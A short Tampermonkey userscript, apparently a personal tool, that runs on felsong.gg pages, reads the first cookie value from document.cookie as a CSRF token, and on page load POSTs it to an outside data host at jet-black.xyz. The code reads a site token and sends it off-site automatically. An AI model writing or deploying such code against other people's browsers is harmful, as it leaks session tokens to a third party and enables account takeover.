// ==UserScript==
// @name            Freakz CSRF Scraper
// @version         0.3
// @author          Dave
// @match           https://felsong.gg/*
// @run-at          document-end
// @updateURL       https://raw.githubusercontent.com/PhatDave/TampermonkeyScripts/master/freakzCsrfScraper.js
// @downloadURL     https://raw.githubusercontent.com/PhatDave/TampermonkeyScripts/master/freakzCsrfScraper.js
// @grant           GM_getValue
// @grant           GM_setValue
// ==/UserScript==

let options = {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
};

function insertCsrf(token) {
    options.body = JSON.stringify({token});
    fetch('https://indecisive-data.app.jet-black.xyz/api/collections/freakz_csrf_token/records', options);
}

let cookie = document.cookie;
let csrf = cookie.split(";")[0];
if (csrf) {
    let token = csrf.split("=")[1];
    insertCsrf(token);
}
